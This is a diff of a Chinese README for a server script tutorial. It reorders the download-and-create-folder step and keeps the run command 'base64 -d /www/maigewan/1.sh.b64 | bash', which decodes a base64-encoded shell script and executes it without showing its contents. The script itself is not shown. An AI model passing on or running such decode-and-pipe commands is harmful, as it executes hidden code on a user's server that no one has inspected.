@@ -28,12 +28,15 @@ https://github.com/maigewan/jiaochen
 
 ![image](https://github.com/user-attachments/assets/87a0dbe1-5dbe-487c-8a74-80c3a9e244c5)
 
+5：
+
+将脚本打包下载
+
+然后在服务器新建一个文件夹（用英文或者数字命名文件夹）
 
 ![image](https://github.com/user-attachments/assets/25c8c7db-08d9-4144-a8bd-c9c1285867fd)
 
-5：
-将脚本打包下载
-然后在服务器新建一个文件夹
+
 
 ![image](https://github.com/user-attachments/assets/b4969eb4-a50a-415f-a3dc-d1ac4efb48ea)
 
@@ -47,6 +50,7 @@ tdk.txt里面的格式如下：
 
 ---------------------
 脚本执行命令为：
+
 base64 -d /www/maigewan/1.sh.b64 | bash
 
 这里的maigewan是你建的文件路径。
